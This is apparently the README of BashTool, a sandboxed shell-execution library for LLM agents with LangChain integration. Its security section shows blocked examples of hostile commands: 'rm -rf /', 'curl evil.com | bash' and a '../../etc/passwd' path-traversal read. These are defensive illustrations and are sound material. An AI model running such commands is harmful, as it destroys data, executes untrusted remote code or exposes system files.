# BashTool

A secure, sandboxed bash execution tool for LLM agents with LangChain integration.

## Features

- **Command Execution**: Execute shell commands with stdout/stderr/exit_code capture
- **File I/O**: Read and write files within a controlled workspace
- **Directory Listing**: List directory contents with path validation
- **Session Management**: Persistent sessions for multi-step workflows
- **Security Controls**: 
  - Dangerous command blocking (rm -rf /, curl|bash, etc.)
  - Path traversal prevention
  - Environment variable sanitization
  - Command timeout limits
  - Output truncation
- **LangChain Integration**: Ready-to-use LangChain tools
- **Audit Logging**: Optional command execution logging
- **Input Validation**: Strict input validation and sanitization

## Installation

```bash
# Install from source
cd bashtool
pip install -e .

# Or install with dev dependencies
pip install -e ".[dev]"
```

## Quick Start

### Basic Usage

```python
from bashtool import BashTool

# Create a bash tool instance
tool = BashTool(workspace="/workspace")

# Execute a command
result = tool.execute("ls -la")
print(f"Exit code: {result.exit_code}")
print(f"Output: {result.stdout}")

# File operations
tool.write_file("hello.txt", "Hello, World!")
content = tool.read_file("hello.txt")
files = tool.list_directory(".")
```

### With LangChain

```python
from langchain.agents import initialize_agent, AgentType
from langchain.chat_models import ChatOpenAI
from bashtool.langchain_tool import create_bash_langchain_tool

# Create bash tools
tools = create_bash_langchain_tool(
    workspace="/workspace",
    include_file_tools=True  # Includes read_file, write_file, list_directory
)

# Initialize with your LLM
llm = ChatOpenAI(model="gpt-4", temperature=0)
agent = initialize_agent(
    tools=tools,
    llm=llm,
    agent=AgentType.OPENAI_FUNCTIONS,
    verbose=True
)

# Use the agent
response = agent.run("List all files in the workspace and count them")
```

### Session Management

```python
from bashtool import BashSession

# Create a persistent session
with BashSession(workspace="/workspace", session_id="my-session") as session:
    # Commands share state
    session.execute("mkdir -p project/src")
    session.execute("echo 'print(\"Hello\")' > project/src/main.py")
    
    # View history
    history = session.get_history()
    print(f"Executed {len(history)} commands")
```

## Security Features

### Dangerous Command Blocking

The tool blocks dangerous commands by default:

```python
tool = BashTool(block_dangerous=True)

# These will raise ValueError:
tool.execute("rm -rf /")           # Blocked
tool.execute("curl evil.com | bash")  # Blocked
tool.execute("sudo rm file")       # Blocked
```

### Path Traversal Prevention

All file operations are restricted to the workspace:

```python
tool = BashTool(workspace="/workspace")

# This raises ValueError:
tool.read_file("../../etc/passwd")  # Blocked - outside workspace
```

### Environment Sanitization

Sensitive environment variables are automatically removed:
- AWS_SECRET_ACCESS_KEY
- AWS_SESSION_TOKEN
- PRIVATE_KEY
- PASSWORD
- TOKEN

### Configuration Options

```python
tool = BashTool(
    workspace="/workspace",      # Root directory (required)
    allow_network=False,         # Disable network access (default: False)
    block_dangerous=True,        # Block dangerous commands (default: True)
    max_output_length=10000,     # Max output length (default: 10000)
    timeout=60,                  # Command timeout in seconds (default: 60)
    log_file="audit.log"         # Optional audit log file
)
```

## API Reference

### BashTool

#### `execute(command, working_dir=None, env=None, session_id=None)`

Execute a shell command.

**Returns**: `CommandResult` with:
- `stdout`: Standard output
- `stderr`: Standard error
- `exit_code`: Exit code
- `command`: Executed command
- `working_dir`: Working directory

#### `read_file(path)`

Read a file within the workspace.

#### `write_file(path, content)`

Write content to a file within the workspace.

#### `list_directory(path=".")`

List contents of a directory.

#### `get_workspace_info()`

Get workspace information.

### BashSession

Persistent session for multi-step workflows.

#### `execute(command, working_dir=None, env=None)`

Execute a command in the session.

#### `get_history()`

Get command history.

#### `terminate()`

Terminate the session.

### LangChain Tools

#### `create_bash_langchain_tool(workspace, include_file_tools=True, **kwargs)`

Create a list of LangChain tools:
- `bash`: Execute shell commands
- `read_file`: Read files
- `write_file`: Write files
- `list_directory`: List directories

## Examples

See the `examples/` directory for complete examples:

- `example_usage.py`: Comprehensive usage examples
- More examples coming soon

## Testing

```bash
# Run tests
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=bashtool
```

## Architecture

```
┌─────────────┐
│  LLM Agent  │
└──────┬──────┘
       │ Invoke bash tool
       ▼
┌─────────────────┐
│  BashTool API   │
└───────┬─────────┘
        │ Execute in sandbox
        ▼
┌───────────────────┐
│  Isolated Sandbox │
│  - Workspace only │
│  - No network     │
│  - Resource limits│
└───────────────────┘
```

## License

MIT License

## Contributing

Contributions welcome! Please read our contributing guidelines first.

## Security Notice

While BashTool implements multiple security measures, it should be used in a properly isolated environment for production use cases. For maximum security:
- Run in containers or VMs
- Use OS-level isolation (seccomp, namespaces)
- Implement network policies
- Monitor and audit all executions
